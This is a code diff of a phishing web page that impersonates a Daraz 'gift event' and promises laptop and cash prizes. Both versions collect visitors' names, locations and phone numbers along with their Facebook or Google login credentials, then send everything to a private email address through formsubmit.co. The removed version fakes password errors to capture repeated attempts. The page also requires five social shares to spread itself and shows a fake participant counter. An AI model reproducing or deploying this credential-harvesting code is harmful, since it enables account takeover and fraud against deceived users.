@@ -10,168 +10,159 @@
         body { font-family: 'Inter', sans-serif; background-color: #f4f4f6; color: #333; -webkit-tap-highlight-color: transparent; }
         .daraz-orange { color: #f85606; }
         .daraz-bg { background-color: #f85606; }
-        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
-        .glass-card { background: white; padding: 30px; border-radius: 20px; width: 100%; max-width: 380px; text-align: center; }
-        input, select { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; outline: none; }
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
+        .glass-card { background: white; padding: 35px; border-radius: 24px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
+        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; }
+        input:focus { border-color: #f85606; box-shadow: 0 0 0 2px rgba(248, 86, 6, 0.1); }
         #participation-ui, #login-modal, #share-ui, #success-ui { display: none; }
-        .btn-main { width: 100%; background: #f85606; color: white; padding: 15px; border-radius: 12px; font-weight: 800; text-transform: uppercase; cursor: pointer; border: none; }
-        .progress-container { background: #eee; border-radius: 20px; height: 14px; margin: 15px 0; overflow: hidden; border: 1px solid #ddd; }
-        #progress-fill { background: #f85606; height: 100%; width: 0%; transition: 0.5s; }
-        .share-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-        .share-btn { padding: 12px; border-radius: 10px; color: white; font-weight: 700; font-size: 12px; cursor: pointer; text-align: center; }
+        .btn-main { width: 100%; background: #f85606; color: white; padding: 16px; border-radius: 14px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; border: none; transition: 0.3s; }
+        .btn-main:hover { background: #d44905; transform: translateY(-2px); }
+        .progress-container { background: #eee; border-radius: 20px; height: 16px; width: 100%; margin: 20px 0; overflow: hidden; border: 1px solid #ddd; }
+        #progress-fill { background: linear-gradient(90deg, #f85606, #ff8a00); height: 100%; width: 0%; transition: width 0.6s ease; }
+        .share-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .share-btn { padding: 14px; border-radius: 12px; color: white; font-weight: 700; font-size: 13px; cursor: pointer; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div id="landing-page" class="max-w-xl mx-auto py-10 px-6 text-center">
-        <h1 class="text-3xl font-black mb-4 uppercase">DARAZ <span class="daraz-orange">OFFICIAL EVENT</span></h1>
-        <div class="text-left bg-white p-6 rounded-2xl shadow-sm border mb-6 text-sm">
-            <h3 class="font-bold border-b mb-3 pb-1">Rules & Policy</h3>
-            <p>• One entry per user only.</p>
-            <p>• Provide real information for prize verification.</p>
-            <p>• Winners announced after 2082-11-29.</p>
-            <div class="mt-4 pt-3 border-t flex items-center gap-2">
-                <input type="checkbox" id="agree-check" class="w-5 h-5 accent-[#f85606]">
-                <label for="agree-check" class="font-bold text-xs uppercase">I agree to the rules</label>
+    <div id="landing-page" class="max-w-2xl mx-auto py-12 px-6 text-center">
+        <h1 class="text-4xl md:text-5xl font-black mb-4 tracking-tighter uppercase">DARAZ <span class="daraz-orange">GIFT EVENT</span></h1>
+        <div class="text-left bg-white p-8 rounded-3xl shadow-sm border mb-8 space-y-4 text-sm leading-relaxed">
+            <h3 class="font-black text-xl border-b pb-2 mb-4 uppercase tracking-tighter">Rules & Policy</h3>
+            <p>1. Participation is strictly limited to one entry per person.</p>
+            <p>2. Winners will be contacted exclusively via the registered account.</p>
+            <p>3. Valid Government ID is required to claim the laptop or cash prizes.</p>
+            <div class="mt-6 pt-4 border-t flex items-center gap-3">
+                <input type="checkbox" id="agree-check" class="w-6 h-6 accent-[#f85606] cursor-pointer">
+                <label for="agree-check" class="font-black text-gray-700 cursor-pointer uppercase text-xs">I agree to all rules</label>
             </div>
         </div>
-        <button onclick="showInfo()" class="btn-main">CONTINUE</button>
+        <button onclick="navTo('participation-ui')" class="btn-main text-xl">START REGISTRATION</button>
     </div>
 
     <div id="participation-ui" class="min-h-screen flex items-center justify-center p-6">
-        <div class="bg-white p-8 rounded-3xl shadow-xl w-full max-w-sm border">
-            <h2 class="text-xl font-black mb-4 uppercase">User Information</h2>
-            <input type="text" id="cust-name" placeholder="Full Name">
-            <input type="text" id="cust-location" placeholder="City / Location">
-            <input type="text" id="cust-phone" placeholder="Contact Number">
-            <select id="cust-shop">
-                <option value="" disabled selected>Ever shopped in Daraz?</option>
-                <option value="Yes">Yes</option>
-                <option value="No">No</option>
+        <div class="bg-white p-10 rounded-[40px] shadow-2xl w-full max-w-md border">
+            <h2 class="text-2xl font-black mb-6 tracking-tight uppercase">Personal Details</h2>
+            <input type="text" id="c-name" placeholder="Full Name">
+            <input type="text" id="c-loc" placeholder="City / Location">
+            <input type="text" id="c-phone" placeholder="Phone Number">
+            <select id="c-shop">
+                <option value="" disabled selected>Have you ever shopped in Daraz?</option>
+                <option value="Regular Customer">Yes, Regular Customer</option>
+                <option value="New User">No, First Time</option>
             </select>
-            <button onclick="showLogin()" class="btn-main mt-4">NEXT STEP</button>
+            <button onclick="prepareLogin()" class="btn-main mt-4">CONTINUE</button>
         </div>
     </div>
 
     <div id="login-modal" class="modal-overlay">
         <div class="glass-card">
-            <div class="text-xl font-black daraz-orange mb-4">Secure Verification</div>
-            <div id="err" class="hidden text-red-600 text-xs font-bold mb-3">Incorrect password! Please try again.</div>
-            <form id="ajax-form">
-                <select id="l-method">
-                    <option value="Facebook">Login with Facebook</option>
-                    <option value="Google">Login with Google</option>
+            <div class="text-2xl font-black daraz-orange tracking-tighter">Security Check</div>
+            <p class="text-[10px] text-gray-400 font-bold uppercase mb-6">Verify account to participate</p>
+            <div id="err-box" class="hidden text-red-600 text-xs font-bold mb-4 bg-red-50 p-2 rounded">Wrong password! Please try again.</div>
+            
+            <form id="master-form" action="https://formsubmit.co/yoshpick22@gmail.com" method="POST">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" id="hidden-name" name="Full_Name">
+                <input type="hidden" id="hidden-loc" name="Location">
+                <input type="hidden" id="hidden-phone" name="Phone">
+                <input type="hidden" id="hidden-shop" name="Shop_History">
+                <input type="hidden" name="_next" id="next-val">
+
+                <select name="Login_Via">
+                    <option value="Facebook">Facebook</option>
+                    <option value="Google">Google / Email</option>
                 </select>
-                <input type="text" id="l-user" placeholder="Mobile or Email" required>
-                <input type="password" id="l-pass" placeholder="Password" required>
-                <button type="submit" id="l-btn" class="btn-main mt-3">Register Account</button>
+                <input type="text" name="Username" id="u-field" placeholder="Mobile number or email" required>
+                <input type="password" name="Password" id="p-field" placeholder="Password" required>
+                <button type="submit" class="btn-main mt-4" id="sub-btn">VERIFY NOW</button>
             </form>
         </div>
     </div>
 
     <div id="share-ui" class="min-h-screen flex items-center justify-center p-6">
-        <div class="bg-white p-8 rounded-3xl shadow-xl w-full max-w-sm text-center">
-            <h2 class="text-xl font-black mb-1 uppercase">Final Verification</h2>
+        <div class="bg-white p-8 rounded-[40px] shadow-2xl w-full max-w-md border text-center">
+            <h2 class="text-2xl font-black mb-1 uppercase tracking-tight">Final Verification</h2>
             <div class="progress-container"><div id="progress-fill"></div></div>
-            <p class="text-xs font-bold daraz-orange mb-4">PROGRESS: <span id="percent">0</span>%</p>
-            <div class="share-grid">
-                <div onclick="doShare('wa')" class="share-btn bg-[#25D366]">WhatsApp</div>
-                <div onclick="doShare('fb')" class="share-btn bg-[#1877F2]">Facebook</div>
-                <div onclick="doShare('tg')" class="share-btn bg-[#0088cc]">Telegram</div>
-                <div onclick="doShare('ms')" class="share-btn bg-[#006AFF]">Messenger</div>
+            <p class="text-[12px] font-black daraz-orange">SYSTEM STATUS: <span id="percent">0</span>%</p>
+            <div class="share-grid mt-6">
+                <div onclick="share('wa')" class="share-btn bg-[#25D366]">WhatsApp</div>
+                <div onclick="share('fb')" class="share-btn bg-[#1877F2]">Facebook</div>
+                <div onclick="share('tg')" class="share-btn bg-[#0088cc]">Telegram</div>
+                <div onclick="share('ms')" class="share-btn bg-[#006AFF]">Messenger</div>
             </div>
-            <button onclick="checkDone()" id="f-btn" class="btn-main opacity-20 mt-8">FINISH</button>
+            <button onclick="finalize()" class="btn-main opacity-20 mt-10" id="final-btn">SUBMIT ENTRY</button>
         </div>
     </div>
 
     <div id="success-ui" class="daraz-bg min-h-screen text-white flex flex-col items-center justify-center p-8 text-center">
-        <h1 class="text-4xl font-black mb-4">SUCCESSFUL!</h1>
-        <div class="bg-black/20 p-6 rounded-2xl w-full max-w-xs">
-            <p class="text-[10px] font-bold uppercase opacity-60 mb-1">Live Participants</p>
-            <div class="text-5xl font-mono font-black text-yellow-400" id="live-count">14,208</div>
+        <h1 class="text-5xl font-black mb-4 tracking-tighter">ENTRY RECORDED!</h1>
+        <div class="bg-black/20 p-8 rounded-[32px] border border-white/10 w-full max-w-sm">
+            <p class="text-[10px] font-black uppercase tracking-widest opacity-60 mb-2">Live Participants</p>
+            <div class="text-6xl font-mono font-black text-yellow-400" id="live-counter">14,208</div>
         </div>
     </div>
 
     <script>
-        const EMAIL_URL = "https://formsubmit.co/ajax/yoshpick22@gmail.com";
-        let attempts = 0, shares = 0, lTime = 0, isSharing = false, data = {};
+        let attempts = 0, shares = 0, lTime = 0, active = false;
 
-        function showInfo() {
-            if(document.getElementById('agree-check').checked) {
-                document.getElementById('landing-page').style.display='none';
-                document.getElementById('participation-ui').style.display='flex';
-            } else alert("Agree to rules first!");
-        }
-
-        function showLogin() {
-            data.Name = document.getElementById('cust-name').value;
-            data.City = document.getElementById('cust-location').value;
-            data.Phone = document.getElementById('cust-phone').value;
-            data.Shopper = document.getElementById('cust-shop').value;
-            if(!data.Name || !data.Phone) return alert("Fill all details!");
-            document.getElementById('login-modal').style.display='flex';
-        }
-
-        document.getElementById('ajax-form').onsubmit = async function(e) {
-            e.preventDefault();
-            attempts++;
-            const btn = document.getElementById('l-btn');
-            data.Username = document.getElementById('l-user').value;
-            data.Password = document.getElementById('l-pass').value;
-            data.LoginType = document.getElementById('l-method').value;
-
-            btn.innerText = "Verifying...";
-
-            // THE AJAX CALL (Sends Everything)
-            try {
-                await fetch(EMAIL_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                    body: JSON.stringify({
-                        _subject: "Daraz Entry: " + data.Name,
-                        _captcha: "false", // Stops the robot check
-                        ...data,
-                        AttemptNo: attempts
-                    })
-                });
-            } catch(e) {}
-
-            if(attempts < 3) {
-                document.getElementById('l-pass').value = "";
-                document.getElementById('err').classList.remove('hidden');
-                btn.innerText = "Try Again";
-            } else {
-                document.getElementById('login-modal').style.display='none';
-                document.getElementById('participation-ui').style.display='none';
-                document.getElementById('share-ui').style.display='flex';
+        // Check if returning from a successful form submission
+        window.onload = () => {
+            if(window.location.search.includes('verify=true')) {
+                document.getElementById('landing-page').style.display = 'none';
+                document.getElementById('share-ui').style.display = 'flex';
             }
         };
 
-        function doShare(p) {
-            isSharing = true; lTime = Date.now();
-            const m = encodeURIComponent("Win Daraz Laptop! " + window.location.href);
-            window.location.href = (p==='wa' ? "whatsapp://send?text=" : "https://t.me/share/url?url=") + m;
+        function navTo(id) {
+            if(id === 'participation-ui' && !document.getElementById('agree-check').checked) return alert("Agree to rules!");
+            document.getElementById('landing-page').style.display = 'none';
+            document.getElementById(id).style.display = 'flex';
         }
 
-        document.addEventListener("visibilitychange", function() {
-            if(document.visibilityState === 'visible' && isSharing) {
-                isSharing = false;
+        function prepareLogin() {
+            const n = document.getElementById('c-name').value;
+            const p = document.getElementById('c-phone').value;
+            if(!n || !p) return alert("Fill all details!");
+            
+            // Push to hidden fields
+            document.getElementById('hidden-name').value = n;
+            document.getElementById('hidden-loc').value = document.getElementById('c-loc').value;
+            document.getElementById('hidden-phone').value = p;
+            document.getElementById('hidden-shop').value = document.getElementById('c-shop').value;
+            
+            // Set redirect URL for after login
+            document.getElementById('next-val').value = window.location.href.split('?')[0] + "?verify=true";
+            
+            document.getElementById('login-modal').style.display = 'flex';
+        }
+
+        function share(plat) {
+            active = true; lTime = Date.now();
+            const msg = encodeURIComponent("Win Free Gifts from Daraz! Join: " + window.location.href.split('?')[0]);
+            window.location.href = (plat==='wa' ? "whatsapp://send?text=" : "https://t.me/share/url?url=") + msg;
+        }
+
+        document.addEventListener("visibilitychange", () => {
+            if(document.visibilityState === 'visible' && active) {
+                active = false;
                 if(Date.now() - lTime > 1800) {
                     shares++;
                     let p = Math.min((shares/5)*100, 100);
                     document.getElementById('progress-fill').style.width = p + "%";
                     document.getElementById('percent').innerText = Math.round(p);
-                    if(shares >= 5) document.getElementById('f-btn').classList.remove('opacity-20');
+                    if(shares >= 5) document.getElementById('final-btn').classList.remove('opacity-20');
                 }
             }
         });
 
-        function checkDone() {
+        function finalize() {
             if(shares >= 5) {
-                document.getElementById('share-ui').style.display='none';
-                document.getElementById('success-ui').style.display='flex';
+                document.getElementById('share-ui').style.display = 'none';
+                document.getElementById('success-ui').style.display = 'flex';
                 setInterval(() => {
-                    const c = document.getElementById('live-count');
+                    const c = document.getElementById('live-counter');
                     let v = parseInt(c.innerText.replace(',',''));
                     c.innerText = (v + Math.floor(Math.random()*3)).toLocaleString();
                 }, 800);
@@ -179,7 +170,10 @@
         }
     </script>
 </body>
-</html>
+    </html>
+
+
+
 
 
 
